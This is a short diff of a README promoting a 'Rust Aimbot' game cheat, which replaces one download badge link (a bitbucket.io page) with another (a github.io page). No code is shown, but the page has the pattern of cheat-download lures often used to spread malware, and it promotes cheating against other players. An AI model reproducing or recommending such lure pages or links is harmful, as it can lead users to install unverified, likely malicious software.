@@ -4,7 +4,7 @@ Rust PvP is sweaty. You get caught farming, trapped mid-reload, sprayed from roo
 
 Whether you’re playing quiet or going full rage, this aimbot will carry you through **any wipe, solo or squad**.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload18.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Rust-Aimbot-hoja7.github.io/.github)
 ---
 
 ## 🧠 What Is the Rust Aimbot?
